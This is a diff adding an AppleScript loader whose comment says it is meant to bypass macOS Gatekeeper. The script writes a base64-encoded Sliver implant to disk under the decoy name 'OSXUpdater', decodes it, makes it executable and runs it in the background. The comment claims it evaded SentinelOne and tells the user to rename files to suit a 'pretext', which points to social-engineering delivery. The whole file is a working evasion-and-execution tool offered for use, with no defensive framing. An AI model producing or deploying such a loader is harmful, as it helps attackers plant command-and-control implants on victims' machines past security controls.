@@ -1,0 +1,19 @@
+(* This Applescript is intended to bypass Mac OSX Gatekeeper and can be launched in a Mac OSX commandline using 'osascript'.
+It takes a base64 encoded Sliver payload (compiled for Mac of course), writes it to a file, decodes it into a binary
+performs chmod +x on the resulting file, then executes the sliver. Tested on Mac OSX Catalina with Gatekeeper and SentinelOne active.
+The sliver was not detected or blocked.
+
+Modify filenames and such to match your purpose/pretext. *)
+
+set encodedUpdater to "<Base64 encoded Sliver goes here>"
+tell application "Finder"
+	set currentPath to container of (path to me) as string
+end tell
+set newPath to currentPath & "OSXUpdater_b64"
+set writePath to open for access file newPath with write permission
+set eof of the writePath to 0
+write encodedUpdater to the writePath starting at eof
+close access the writePath
+do shell script "base64 --decode -i OSXUpdater_b64 -o OSXUpdater"
+do shell script "chmod +x OSXUpdater"
+do shell script "./OSXUpdater &"
